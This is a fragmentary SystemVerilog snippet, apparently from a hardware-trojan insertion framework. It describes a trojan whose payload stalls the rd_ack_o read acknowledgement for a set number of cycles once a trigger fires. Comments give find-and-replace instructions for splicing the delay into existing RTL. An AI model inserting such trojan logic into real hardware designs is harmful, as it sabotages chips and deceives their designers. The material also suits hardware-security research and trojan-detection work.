 ...
 * Payload: Delay rd_ack_o by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && rd_req_i) begin
...
// ============================================================
// Performance Degradation: Delay rd_ack_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF rd_ack_o is a ready/valid signal:
//   Find: assign rd_ack_o = ready_condition;
//   Replace: assign rd_ack_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF rd_ack_o is in always_ff:
//   Find: rd_ack_o <= ready_value;
//   Replace: rd_ack_o <= (delay_counter == 0) ? ready_value : 1'b0;